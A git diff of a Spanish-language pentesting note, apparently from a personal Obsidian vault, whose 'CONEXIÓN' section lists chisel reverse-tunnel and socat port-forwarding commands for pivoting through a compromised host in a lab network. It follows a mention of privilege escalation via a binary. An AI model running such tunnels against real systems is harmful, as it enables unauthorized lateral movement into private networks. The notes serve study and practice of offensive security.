@@ -486,13 +486,13 @@ explotando este binario logramos conseguir una bash con privilegios elevados
 # CONEXIÓN
 
 ```python
-❯ ./chisel server --reverse -p 8000
+> ./chisel server --reverse -p 8000
 
 > ./chisel client 10.0.2.4:8000 R:socks
 
 > ./socat TCP-LISTN:1221,fork TCP:10.0.2.4:9001
 
-
+#Nota: para hacerlo de manera inversa, es decir. hacer una peticion desde la maquina atacante la
 ```
 
 [GraficoPivoting](obsidian://open?vault=ObsidianGIT&file=Excalidraw%2FPivoting.excalidraw) 
